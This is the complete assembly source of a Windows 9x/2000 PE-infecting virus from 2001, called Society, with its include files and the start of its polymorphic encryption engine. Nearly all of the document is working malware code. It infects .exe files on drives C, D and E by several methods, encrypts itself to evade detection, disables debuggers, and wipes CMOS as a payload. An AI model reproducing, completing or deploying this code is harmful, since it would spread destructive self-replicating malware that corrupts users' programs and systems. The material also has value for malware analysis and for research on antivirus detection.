
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SOCIETY.TXT]ÄÄÄ
;==============================================================================
;                   Win9x/Win2k.Society.3434 (c) necr0mancer
;				december 2001
;ring-3 PE infector
;
;Features:
;
; *     Works only in win2k & win9x,but can work on winNT(I haven't it!) if
;       you add it kernel base on table (see source).
; *     Polymorphic (use NPE32 engine).
; *     Some infection methods (EPO,standart, .reloc OR .debug overwrite).
; *     Simple antidebug.
; *     Payload (on trace with td32:)) CMOS kill.)
; *     Not infecting winzip self-extactors & upx-packed files
;
;Tnx: to all who write stuff.
;                          Infection sheme:
;
;==============================================================================
;                           ÚÄÄÄÄÄÄÄÄÄÄÄ¿
;                           ³   main    ³     ÍÍÍÍÍ  - incorect secton size
;                           ÀÄÄÄÄÄÂÄÄÄÄÄÙ
;                           ÚÄÄÄÄÄÁÄÄÄÄÄ¿
;                           ³ find reloc³
;                           ÀÄÄÄÄÄÂÄÄÄÄÄÙ
;                       ÚÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄ¿
;                    ÚÄÄÁÄÄÄ¿           ÚÄÄÄÁÄÄ¿
;    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´findedÆÍÍÍÍÍÍ»    ³failed³
;    ³               ÀÄÄÂÄÄÄÙ      º    ÀÄÄÄÂÄÄÙ
;    ³        ÚÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄ¿    º   ÚÄÄÄÄÁÄÄÄÄÄÄÄÄ¿
;    ³        ³ EPO infection ³  ÚÄ×ÄÄÄ´ find .debug ³
;    ³        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  ³ º   ÀÄÄÄÄÂÄÄÄÄÄÄÄÄÙ
;    ³                           ³ º        ³
;    ³ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿    ³ º   ÚÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;    ÀÄ´Overwrite infection ÃÄÄÄÄÙ ÈÍÍÍµ"standart" infection ³
;      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
;
;==============================================================================



include  1.inc
include  win.inc

PAGE_READWRITE equ  4
FILE_MAP_WRITE equ  2
DEBUG          equ  0                                   ;no debug-release;)

extrn   MessageBoxA:near
extrn   ExitProcess:near


VIRTUAL_SIZE  equ (offset _endvbody-offset _start)
PHYSICAL_SIZE equ (offset _fbodyend-offset _start)
DEBUG         equ 0

        .586p
        .model flat

        .data

message_title  db '[Dekadance] has been start.',0

_message       db 'Credo:',0dh
               db 'Dekadance is lifestyle.',0dh,0dh
               db 'Copyleft (c) 2001 necr0mancer',0
        .code

_emulation:

                push eax                                ;jmp viri
                xor eax,eax
                jmp _callz_manager

Original:

                push MB_ICONEXCLAMATION
                push offset message_title
                push offset _message
                push 0
                call MessageBoxA

                push    0
                call ExitProcess                        ; call    ExitProcess

;------------------------------------------------------------------------------
;Run loader
_callz_manager:

                pushfd                                  ;save flags&regs
                pusha

@cm             equ             <-offset @@GetDelta>

                call @@GetDelta                         ;get delta
@@GetDelta:
                pop ebp

if  DEBUG eq 1
                int 3
endif


                and eax,0ffh                            ;AL=# in function table
                push eax
                push ebp

                xor edi,edi

nop_call:
                call _start
                pop ebp

                push edi
                lea edi,[ebp+nop_call @cm]
                mov eax,90909090h                       ;write nop for next call
                stosd
                stosb
                pop edi

                pop eax                                 ;eax=# in function table
                shl eax,3                               ;eax*8

                or edi,edi                              ;first mng_call?
                jnz table_offset_exist

                db (0b8h OR __edi)                      ;mov edi,xxxxxxxx
                delta_tbl dd 0

                jmp short get_me_out

table_offset_exist:

                mov [ebp+delta_tbl @cm],edi             ;save table_pointer
                                                        ;for next calls
get_me_out:
                lea edi,[edi+eax]

                mov eax,[esp+8*4+4]                     ;restore old eax
                mov [esp._eax],eax
                mov [esp+8*4+4],edi                     ;write ret adr

                popa
                popfd
                ret

;==============================================================================
;Virii part

@ex             equ             <-offset Delta>

_start:
                call Delta                              ;get Delta
Delta:

if DEBUG eq 1
                int 3
endif
                pop ebp
                jmp short AfterData                     ;go to main part

;                          === some data ===

imagebase       dd 00400000h
OldRVA          dd (offset Original-00400000h)
fmask           db '*.exe',0

tbl:

                dd 77e80000h
                dd 0Bff70000h
                dd 0

jmp_table:
                mov eax,offset Original
                jmp eax
                dq 9 dup (0)

Mask_table:

                db 2
                dw 025FFh                               ;jmp xxxxxxx
                db 0
                db 0
                db 0

;=============================================================================
Fsize           dd ?
Voff            dd ?
Foff            dd ?
MZbase          dd ?

AfterData:

                db 0b8h                                 ;mov eax,xxxxxxxx
                reTT_need dd 1                          ;flag of type infection

                or eax,eax
                jnz no_need_heh

                mov eax,[ebp+OldRVA @ex]                ;restore old entrypoint
                add eax,[ebp+imagebase @ex]
                push eax                                ;FOR returning in prog

no_need_heh:

                lea esi,[ebp+jmp_table @ex]             ;copy adr_table
                lea edi,[ebp+jmp_tmp_table @ex]
                mov ecx,10*2
                rep movsd

                lea eax,[ebp+offset @@@error_handle @ex];find kernel base
                push eax

                xor eax,eax
                push 4 ptr fs:[eax]                     ;set SEH
                mov fs:[eax],esp

                lea esi,[ebp+offset tbl @ex]            ;possible kernel bases
                lea edi,[ebp+offset __kernel32 @ex]

                pusha
                jmp _lodsd
_ex:
                pop 4 ptr fs:[eax]                      ;restore SEH
                pop eax                                 ;
                jmp no_yet                              ;& exit

;=============================================================================

@@@error_handle:

                mov esp,[esp+8]
                sub esp,20h

_lodsd:
                popa
                lodsd
                or eax,eax                              ;end of table ?
                je _ex
                mov [edi],eax
                pusha

                db 0b8h
__kernel32      dd 0


                cmp word ptr[eax],'ZM'                  ;test on MZ
                jne _lodsd
__ok:
                xchg eax,ebx
                xor eax,eax
                add esp,20h
                pop 4 ptr fs:[eax]                      ;restore SEH
                pop eax

;==============================================================================

sys_ok:

                lea esi,[ebp+offset _Table @ex]         ;table of CRC32
                lea edi,[ebp+offset _adr @ex]           ;table of needed
                                                        ;function's adresses
Ft_repeat:

                call get_proc_adr                       ;find adress

                or eax,eax                              ;no finded :(
                jz  end_Ft_cycle
                stosd

                jmp Ft_repeat

end_Ft_cycle:


                out 70h,al                              ;
                in al,71h                               ;
                inc al                                  ;
                shl eax,8                               ;
                mov ecx,1000000                         ; GET RANDOM NUMBER
                loop $                                  ;
                out 70h,al                              ;
                in al,71h                               ;
                not eax
                                                        ; save it
                mov [ebp+__seed @ex],eax                ; for virii
                inc eax                                 ;
                mov [ebp+runSeed @ex],eax               ; and for NPE


                xor eax,eax                             ;files infected=0
                mov 4 ptr[ebp+FileNum @ex],eax

                mov [ebp+our_ebp @ex],ebp               ;save current delta
                                                        ;for creating thread

                xor ebx,ebx                             ;ebx=0

                lea eax,[ebp+offset Thr_indefirer @ex]
                push eax

                push ebx                                ;push 0
                push ebx                                ;push 0

                lea eax,[ebp+offset Thread_proc @ex]    ;offset to thread proc
                push eax

                push ebx                                ;push 0
                push ebx                                ;push 0
                call [ebp+CreateThread @ex]             ;Create thread

no_yet:
                lea edi,[ebp+offset jmp_tmp_table @ex]  ;get jmp_table pointer
                                                        ;to calls_manager
                retn                                    ;exit to parent code

Thread_proc:

                db (0b8h or __ebp)                      ;mov ebp,xxxxxxxx
                our_ebp dd 0

                lea edi,[ebp+SearchRec @ex]
                lea edx,[ebp+dirname @ex]
                mov [edx],'\:C'
                call filefind                           ;infect drives

                mov [edx],'\:D'
                call filefind

                mov [edx],'\:E'
                call filefind

                db 0b8h                                 ;mov eax,xxxxxxxx
Thr_indefirer   dd 0

                push eax
                call [ebp+ExitThread @ex]               ;good bye!

;=========================================================================================
;Input: esi=offset of string
;       ebx=kernel adr
;Out  : eax=adr(if has finded;))

get_proc_adr       proc

                push edi

                push eax
                lodsd
                mov [ebp+crc32 @ex],eax                 ;save getted crc
                pop eax

                mov ecx,[ebx+3ch]                       ;PE-header offset
                add ecx,ebx

                mov ecx,[ecx+78h]                       ;Export table offset
                jecxz return_0                          ;if (et=null) then err

                add ecx,ebx                             ;ecx-offset of export
                                                        ;table
                xor edi,edi
_search:

                mov edx,[ecx+20h]                       ;offsets on FuncNames
                add edx,ebx                             ;correct on base

                mov edx,[edx+edi*4]
                add edx,ebx

                push esi                                ;crc table
                push ecx                                ;base

                mov esi,edx
                push edx

find_zero:

                lodsb
                or al,al
                jnz find_zero
                dec esi

                sub esi,edx
                xchg ecx,esi

                pop esi
                call CRC32

                db (0b8h or __edx)                      ;mov edx,crc
                crc32  dd 0

                pop ecx                                 ;base
                pop esi                                 ;table

                cmp edx,eax
                je _name_found

                inc edi
                cmp edi,[ecx+18h]
                jb _search

return_0:

                xor eax,eax                             ;error ocures
                jmp _return

_name_found:
                                                        ;esi=index on string table
                mov edx,[ecx+24h]
                add edx,ebx
                movzx edx,word ptr [edx+edi*2]

                mov eax,[ecx+1ch]                       ;AdrTable
                add eax,ebx                             ;correct on base

                mov eax,[eax+edx*4]
                add eax,ebx                             ;get adress of nedded function

_return:

                pop edi                                 ;in output eax
                retn
get_proc_adr       endp


;=============================================================================
;                               INFECT
;=============================================================================

infect  proc
                pushad

                mov esi,edx                             ;esi=edx=full name

_findzero:
                lodsb
                or al,al
                jnz _findzero
                                                        ;esi=offset of null byte+1
                mov eax,[esi-4]

                cmp eax,00455845h                       ;EXE?
                je exe_infect

                cmp eax,00657865h                       ;exe?
                jne no_EXE

exe_infect:

                cmp byte ptr [ebp+FileNum @ex],15
                ja no_EXE                               ;More than 15 files?

_gogo:
                call fopen                              ;edx=FileName

                or eax,eax                              ;error ocures?
                je i_close_exit

                xchg ebx,eax                            ;ebx=handle
                call f_createmap                        ;createfilemapping

                mov [ebp+MZbase @ex],eax
                xchg eax,edx                            ;edx=mem_adr

                mov ax,word ptr[edx+18h]
                cmp al,40h
                jne i_close_exit

                mov eax,[edx+3ch]
                add edx,eax                             ;EDX=offset of PE header
                mov eax,[edx]
                cmp ax,'EP'                             ;really PE ?
                jne i_close_exit


;get last section

                movzx eax,word ptr[edx+14h]             ;NT header size
                add eax,18h                             ;Size of PE-header
                add eax,edx                             ;Eax=offset of Object table

                push eax
                push edx

                movzx eax,word ptr[edx+6h]              ;Number of objects

                dec eax
                smov esi,40                             ;size of table
                mul esi                                 ;result in EDX:EAX

                xchg esi,eax                            ;ESI=offset of last object

                pop edx
                pop eax

                mov edi,eax                             ;edi=Object-table
                add esi,eax                             ;correct(esi=last object)

                push edi

;=============================================================================

;find  winzip or UPX0

                mov al,1
                movzx ecx,word ptr[edx+6h]              ;Number of objects
find_upx:

                cmp 4 ptr[edi],'niw_'                   ;_winzip_
                je zip_upx

                cmp 4 ptr[edi],'0XPU'                   ;UPX0
                je zip_upx

                add edi,40
loop   find_upx

                xor eax,eax
zip_upx:
;=============================================================================
                pop edi
                or eax,eax
                jnz i_close_exit

                mov eax,[edx+34h]                       ;get & save imagebase
                mov [ebp+imagebase @ex],eax

                mov ecx,[esi+10h]                       ;get Fsize
                mov [ebp+Fsize @ex],ecx

                mov eax,[esi+8h]                        ;get Vsize
                or eax,eax                              ;Vsize=0?
                jz i_close_exit

                or ecx,ecx                              ;Fsize=0?
                jz i_close_exit

                cmp eax,ecx                             ;Vsize<Fsize
                jb i_close_exit

                mov eax,[esi+14h]                       ;get Foffset
                mov [ebp+Foff @ex],eax

                mov eax,[esi+0Ch]                       ;get Voffset
                mov [ebp+Voff @ex],eax

                mov ecx,'emit'                          ;check & write sign
                cmp [edx+08h],ecx
                je i_close_exit
                mov [edx+08h],ecx

                push esi                                ;esi=last (copy)
                push eax                                ;SAve VO of virii
                push edi                                ;obj-table offst



;find .reloc section
                movzx ecx,word ptr[edx+6h]              ;Number of objects
find_reloc:

                cmp 4 ptr[edi],'ler.'                   ;.reloc
                je question_EPO

                add edi,40
loop            find_reloc

;==============================================================================
;find .debug section

                pop edi                                 ;begin of sections tabl.
                movzx ecx,word ptr[edx+6h]              ;Number of objects
find_debug:
                cmp 4 ptr[edi],'bed.'                   ;.debug
                je @@reloc_debug_finded

                add edi,40
loop   find_debug

;==============================================================================
;neither .reloc nor .debug not finded

                jmp @@Standart

@@reloc_finded_stack:

                pop eax                                 ;clear stack

@@reloc_debug_finded:                                   ;.reloc or .debug are finded

                mov eax,[ebp+MZbase @ex]                ;begin of Exe
                add eax,[edi+14h]                       ;esi=Physical_Offset of .debug section
                mov 4 ptr[ebp+reloc_offset @ex],eax
@@Overwrite:
                add esp,4*2

                xor ecx,ecx
                mov [ebp+reTT_need @ex],ecx             ;set flag @@overwrite=0

                xchg edi,esi                            ;esi=.reloc secton

                lea eax,[edx+28h]                       ;set new RVA
                mov ecx,[eax]
                or ecx,ecx
                jz   i_close_exit                       ;RVA=0

                mov [ebp+OldRVA @ex],ecx

                mov ecx,[esi+0ch]                       ;section RVA
                mov [eax],ecx

                mov eax,10000                           ;get 10 kb
                call GetMem

                push eax
                xchg edi,eax

                call call_NPE32                         ;edi=bufer dectination

                mov  [esi+24h],0E0000020h               ;set attributes
                add  [esi+10h],ecx                      ;Add virus size

                xchg edi,esi                            ;esi=data
                db (0B8h or __edi)                      ;mov edi,xxxxxxxx
reloc_offset  dd 0
                rep movsb                               ;write virii

                jmp common_exit

@@Standart:
                pop esi                                 ;<<<clear stack
                pop esi

                xor ecx,ecx
                mov [ebp+reTT_need @ex],ecx             ;set flag @@overwrite=0

                lea edi,[edx+28h]                       ;set new RVA
                mov ecx,[edi]
                or ecx,ecx                              ;RVA==0    ?
                jz   i_close_exit

                mov [ebp+OldRVA @ex],ecx
                mov eax,[ebp+Voff @ex]
                add eax,[ebp+Fsize @ex]                 ;eax=virtual offset+physic size=new RVA
                mov [edi],eax

                mov eax,10000                           ;10 kb
                call GetMem
                push eax
                xchg edi,eax

                mov ecx,[edx+38h]                       ;Virtual aligment
                mov eax,VIRTUAL_SIZE+400h*2             ;add 2 kb for decryptor
                call Round                              ;align to phys_aligment

                add  [esi+08h],eax                      ;Add virus size to section
                mov  eax,[esi+08h]

                mov ecx,[ebp+Voff @ex]                  ;Virtual offset+virtualsize
                add ecx,eax
                mov [edx+50h],ecx                       ;Correct imageSize

                mov [esi+24h],0E0000020h                ;set attributes

                call call_NPE32
                add  [esi+10h],ecx                      ;Add virus size

                push ecx
                mov ecx,[ebp+Foff @ex]
                add ecx,[ebp+Fsize @ex]                ;Offset of end of last section
                call fseek
                pop ecx                                ;restore cpypted_size

                call fwrite                            ;write virii

                jmp common_exit

;==============================================================================
question_EPO:

                cmp 4 ptr[edi+10h],PHYSICAL_SIZE+900h   ;check section size
                jnb size_s_ok

                pop eax                                 ;<<<clear stack
                jmp @@Standart                          ;standart infect
size_s_ok:                                              ;if reloc < virsize

                smov eax,3                              ;max 2
                call randomGen                          ;get random number

                or eax,eax                              ;0 = make overwrite
                jnz _dbg                                ;1 = make EPO
                                                        ;2 = debugers sucks:)
                                                        ; & EPO
_clear_one_param:

;               pop eax                                 ;<<<clear stack
;               jmp @@reloc_debug_finded
                jmp @@reloc_finded_stack

_dbg:
                dec eax                                 ;eax==1?
                jz @@reloc_EPO

                call Debuger_fuckup

@@reloc_EPO:

                pop eax                                 ;first obj.

                inc 4 ptr[ebp+reTT_need @ex]            ;set flag @@overwrite
                                                        ;into 1 or whatever value

                mov esi,[ebp+MZbase @ex]                ;begin of Exe
                add esi,[eax+14h]                       ;esi==Physical_Offset of first section

                pop eax                                 ;clear stack<<<<

                mov eax,[ebp+Voff @ex]
                add eax,[ebp+Fsize @ex]                 ;eax=virtual offset
                                                        ;+physic size=new RVA

                mov ecx,[edi+0ch]                       ;get section RVA

                pop eax                                 ;clear stack<<<<
                push edi                                ;.reloc offset

                mov edi,[edi+14h]                       ;edi=offset of .reloc section
                add edi,4 ptr[ebp+MZbase @ex]           ;correct on begin of file

                mov eax,400h                            ;write_some_garbage
                call randomGen
                inc eax
                add ecx,eax                             ;correct RVA_reloc

                add eax,edi
                mov [ebp+EPO_edi @ex],eax

                lea eax,[ebp+Mask_table @ex]
                push eax

                lea eax,[ebp+replace @ex]
                push eax

                smov eax,10                             ;get random (max 10)
                call randomGen
                inc eax

                push eax                                ;count of functions
                push edi                                ;RELOC offset
                push esi                                ;CODE  offset
                push ecx                                ;virtual offset

;-----------------------------------------------------------------------------
;Create_UEP(
;       dword   VO                      // virtual offset
;       *dword  code                    // offset to .code section(already has read)
;       *dword  reloc                   // offset to .reloc section(already has read)
;       dword   num_records             // count of records in table to rewrite
;       *dword  adr_modify              // address of "replasing" proc
;       *dword  mask_table              // pointer to a mask table
;        );
;-----------------------------------------------------------------------------

                call Create_UEP

                pop esi                                 ;restore original esi
                jc  i_close_exit                        ;no_relocs_finded :(

                mov eax,10000                           ;get 10 kb
                call GetMem
                push eax
                xchg edi,eax                            ;edi=mem

                call call_NPE32                         ;cpypt virii

                add  [esi+10h],ecx                      ;Add virus size
                mov  [esi+24h],0E0000020h               ;set attributes

                push ecx
                push edi

                db (0b8h or __edi)                      ;mov edi,EPO_edi
                EPO_edi dd 0

                lea esi,[ebp+c_manager @ex]
                mov ecx,cm_size                         ;manager size
                rep movsb                               ;copy "manager"

                pop esi
                pop ecx
                rep movsb                               ;copy virii

common_exit:

                call [ebp+GlobalFree @ex]               ;free memory
                inc byte ptr [ebp+FileNum @ex]

i_close_exit:

                call  f_closemap                        ;unmap file from memory
                call  fclose                            ;close file
no_EXE:

                popad
                retn

infect  endp

;==============================================================================
;In: edx=dirname
;    edi=SearchRec
filefind  proc
                pushad

                sub   esp,1024                          ;for full directory name

                mov esi,edx                             ;esi=offset of dirname
                mov edi,esp                             ;edi=memory for FULL dirname

_scopy:
                lodsb
                stosb
                or al,al                                ;end of ASCIIZ string?
                jnz _scopy

                dec edi

                mov al,'\'                              ;add '\' if need
                cmp [edi-1],al
                je _estislesh
                stosb
_estislesh:

                mov esi,edi                             ;esi=position for file/dir

                mov eax,'*.*'
                stosd
                mov eax,esp

                mov edi,[esp+1024]                      ;restore edi
                push  edi

                push  eax

                call  [ebp+FindFirstFile @ex]           ;eax=handle for search

                inc eax
                jz    ff_quit                           ;cmp eax,-1
                dec eax

                xchg  ebx,eax                           ;search handle

ff_infect:

                push ecx                                ;pause
                mov ecx,1000000
                loop $
                pop ecx


                pushad
                xchg esi,edi                            ;edi=position of file/dir,esi=ff_struc
                lea esi,[esi].ff_fullname               ;esi=finded name
_sadd:

                lodsb                                   ;string add
                stosb
                or al,al
                jnz _sadd
                popad

                mov edx,esp                             ;FULL name of file/dir

                test  byte ptr [edi].ff_attr, 16
                jnz   ff_dir                            ;dir?

                call  infect                            ;no dir,infect
                jmp ff_next

ff_dir:

                cmp  byte ptr [edi].ff_fullname,'.'
                je   ff_next

                call filefind

ff_next:

                push edi
                push ebx
                call [ebp+FindNextFile @ex]

                or eax,eax
                jnz   ff_infect                         ;no dirs/files?

ff_quit:

                push ebx
                call [ebp+FindClose @ex]

                add esp,1024

                popad
                retn
filefind  endp


;==============================================================================
;In  : edi=bufer
;Out : ecx=size generated
;modify :eax,edx,ecx
call_NPE32      proc

		call Debuger_fuckup

                push ebx
                push edx
                xor eax,eax
                inc eax
                cpuid                                   ;get unical value
                xor eax,edx                             ;for this CPU
                pop edx
                pop ebx

                push eax                                ;move it in flags

                mov eax,[ebp+offset runSeed @ex]
                push eax                                ;seed (or NULL)

                xor eax,eax
                mov [ebp+offset runSeed @ex],eax        ;seed has been
                                                        ;inicialized == NULL

_push_size:

                mov eax,PHYSICAL_SIZE
                push eax                                ;size

                push edi                                ;bufer

                lea eax,[ebp+offset _start @ex]         ;data
                push eax


;==============================================================================
;int NPE_main(
;      offset data
;      offset bufer
;      count_bytes
;      seed (nul if not 1st generation)
;      flags
;      )
;==============================================================================

                call npe_main                           ;out eax=size
                xchg ecx,eax
                jnc  e_call_npe32                       ;if no errors

;----------------               error              ------------------

                mov ecx,PHYSICAL_SIZE
                pusha
                lea esi,[ebp+offset _start @ex]         ;data
                ;edi = bufer
                rep movsb                               ;copy virii to bufer
                popa
e_call_npe32:
                retn
call_NPE32      endp
;==============================================================================


GetMem  proc

                pusha
                push eax
                push GMEM_FIXED
                call [ebp+GlobalAlloc @ex]              ;GetMemory
                ;eax=offset of getted memory

                mov [esp._eax],eax
                popa

                retn
GetMem  endp

;==============================================================================
;Input:ecx=field of rounding
;      eax=size
Round   proc
                bsr ecx,eax                             ;Scan backward for bit

                dec ecx

                shr eax,cl
                inc eax
                shl eax,cl

                retn
Round   endp

;==============================================================================
CRC32   proc
                pusha

                db (0b8h or __ebx)                      ;mov ebx,polinom
                polinom dd 04c11db7h

                xor edx,edx
next_8_bites:
                push ecx

                xor eax,eax
                lodsb
                shl  eax,32-8-1
                smov ecx,8
carry_find:

                shl eax,1
                shld edx,eax,1
                jnc not_carry

                xor edx,ebx
not_carry:

                loop carry_find

                pop ecx

                loop next_8_bites


                ;add null bites

                smov ecx,32+8+1
@carry_find:
                shl edx,1
                jnc @not_carry
                xor edx,ebx

@not_carry:
                loop    @carry_find

                mov [esp._eax],edx                      ;return CRc in eax

                popa
                ret
CRC32   endp

;==============================================================================
replace:

;=== copy old jumper to table===
;ecx=#of finded
;edi=offst of command(cor)
;ebx=offset of commnd(phys)
;esi=setted virtual offset
        pusha

        push esi

        push edi
        xchg edi,esi
        lea edi,[(ebp+offset jmp_table)+ecx*8 @ex] ;num in table
        movsd
        movsd
        pop edi

        mov ax,0b050h                   ;push eax+mov al
        stosw

       ;ecx=count/index
        xchg eax,ecx                     ;eax=num records param
        mov ah,0e9h                      ;jmp.....
        stosw

        pop eax                         ;VO
        sub eax,ebx
        sub eax,5+3                      ;Pa3Huya
        stosd

        popa
        retn
;==============================================================================






;=============================================================================
randomGen       proc
                pusha
                push eax                                ;save max_random

                db 0b8h                                 ;mov eax,xxxxxxxx
                __seed dd 12345678h

                mov edi,134775813                       ;eax=new seed
                mul edi                                 ;EDX:EAX=EAX*EDI
                inc eax
                mov [ebp+__seed @ex],eax

                xor edx,edx

                pop ecx
                or ecx,ecx                              ;max_random=0
                jz __div_0
                div ecx

                mov [esp._eax],edx

__div_0:
                popa
                ret
randomGen       endp

;=============================================================================
Debuger_fuckup          proc
                pusha

                call [ebp+IsDebuggerPresent @ex]        ;catch stupid TD32 ;)
                or eax,eax
                jnz fuckup

                push edi
                sidt [esp-2]
                pop  edi

                mov [edi+1*8],eax                       ;kill int 1
                mov [edi+3*8],eax                       ;kill int 3

                mov dr0,eax                             ;kill debug system regs
                mov dr1,eax                             ;NOTE:
                mov dr2,eax                             ;  SoftIce is interrupts
                mov dr3,eax                             ;  this commands &
                                                        ;  virii suck.
                popa
                retn

fuckup:
                smov eax,5eh                            ;Clear CMOS
                smov edx,70h
                call PM_out

                xor eax,eax
                smov edx,71h
                call PM_out

                jmp $

;=============================================================================
PM_out          proc

                push    eax
                push    edx
                mov     edx, esp
                smov     eax,0F7h                       ;WRITE_PORT_UCHAR
                int     2Eh
                add     esp, 2*4
                retn
PM_out          endp
;=============================================================================

Debuger_fuckup          endp

c_manager:
include call_mng.inc
cm_size equ $-offset c_manager

include RIPbin.inc
include ring3io.inc
include npe32bin.inc


_Table:

_CreateFileA            dd              0830F55B4h
_CreateFileMapping      dd              06817C213h
_MapViewOfFile          dd              0CF4C00A1h
_UnmapViewOfFile        dd              0C027BC23h

_CloseHandle            dd              07CD0735Bh
_ReadFile               dd              02804FB4Dh
_FindFirstFileA         dd              0A32BE888h
_FindNextFileA          dd              0233AEB5Eh
_FindClose              dd              0E6CCF387h
_GlobalAlloc            dd              06CCA7EE0h
_GlobalFree             dd              04753EBE5h
_SetFilePointer         dd              0E747C386h
_WriteFile              dd              018D5ABDFh
_GetCurrentDirectoryA   dd              0B089B6BEh
_IsDebuggerPresent      dd              015B27F29h
_ExitThread             dd              01E799321h
_CreateThread           dd              072F17A7Bh

its_over                dd              0FFFFFFFFh
_fbodyend:




_adr:
CreateFile              dd      ?           ;2

CreateFileMappingA      dd      ?
MapViewOfFile           dd      ?
UnmapViewOfFile         dd      ?

CloseHandle             dd      ?           ;3
ReadFile                dd      ?           ;4
FindFirstFile           dd      ?           ;6
FindNextFile            dd      ?           ;7
FindClose               dd      ?           ;8
GlobalAlloc             dd      ?           ;9
GlobalFree              dd      ?           ;a
SetFilePointer          dd      ?           ;b
WriteFile               dd      ?           ;c
GetCurrentDirectory     dd      ?     ;d
IsDebuggerPresent       dd      ?
ExitThread              dd      ?
CreateThread            dd      ?

;-------------------------------------

curdir          db 260 dup (?)
SearchRec       f_struc<,,,,,,,>

DirNum          db ?
FileNum         db ?
bytesread       dd ?


first_run_npe   dd ?
runSeed         dd ?
dirname         dd ?

jmp_tmp_table:
               dq 10 dup (?)
_endvbody:
end _emulation

;==============================================================================
;							 (C) necr0mancer 2001
;                            			  necr0mancer2001@hotmail.com
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SOCIETY.TXT]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[1.INC]ÄÄÄ
MAX_GARBAGE equ 6
MAX_OPERATIONS equ 5

;cryptor size
; 100+(6*5*6*5)~1kb maximum
;
;


__eax equ 000b 
__ebx equ 011b 
__edx equ 010b 
__ecx equ 001b 
__esi equ 110b 
__edi equ 111b 
__ebp equ 101b 

smov macro p1,p2
if p2 gt 07fh

	 if p2 lt 100h

 		if p1 eq eax  
			xor eax,eax
			mov al,&p2&
		endif

		if p1 eq ebx  
			xor ebx,ebx
			mov bl,&p2&
		endif

		if p1 eq ecx  
			xor ecx,ecx
			mov cl,&p2&
		endif

		if p1 eq edx
			xor edx,edx
			mov dl,&p2&
		endif
	else

        	mov &p1&,&p2&

        endif

else
     push &p2&
     pop  &p1&
endif

endm

opcod struc
  code      dw 0
  flags     db 0
  code_num  db 0
opcod ends
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[1.INC]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CALL_MNG.INC]ÄÄÄ
;=============================================================================
;Api_call stub (c) necr0mancer
;necr0mancer2001@hotmail.com
;=============================================================================
db 09Ch,060h,0E8h,000h,000h,000h,000h,05Dh,0CCh,025h,0FFh,000h,000h,000h,050h
db 055h,033h,0FFh,0E8h,031h,000h,000h,000h,05Dh,057h,08Dh,07Dh,00Bh,0B8h,090h
db 090h,090h,090h,0ABh,0AAh,05Fh,058h,0C1h,0E0h,003h,00Bh,0FFh,075h,007h,0BFh
db 000h,000h,000h,000h,0EBh,003h,089h,07Dh,026h,08Dh,03Ch,007h,08Bh,044h,024h
db 024h,089h,044h,024h,01Ch,089h,07Ch,024h,024h,061h,09Dh,0C3h 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CALL_MNG.INC]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[NPE32BIN.INC]ÄÄÄ
;==============================================================================
;                       Necromancer's Polymorphic Engine
;                                    v 1.0
;                        (c) necr0mancer december 2001
;
;
;stdcall
;int NPE_main(
;               DWORD   *offset data                    //offset to data
;               DWORD   *offset bufer                   //offset of bufer(see ramarks)
;               DWORD   count_bytes                     //size of crypting data
;               DWORD   seed                            //(see remarks)
;               DWORD   flags                           //(see remarks)
;            );
;
;Output: EAX = Size of crypted data and decryptor.
;        cf  = 1 if error 
;        cf  = 0 if success
;
;Remarks:
;    Engine must run in r/w section.
;
;   *bufer : Size of bufer must be larger of really size data beakose NPE use
;            bufer for building cryptor/decryptor.
;            In real size of bufer must be about 400h*3+size of data+1
;            But I test it with many-memory allocate & can't said
;            about working npe32 with little bufer.
;
;   Flags:
;
;         bits:
;        ÚÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;        ³  0..6   ³ Using regs32                          ³
;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  7      ³ Antidebug functions enabled           ³
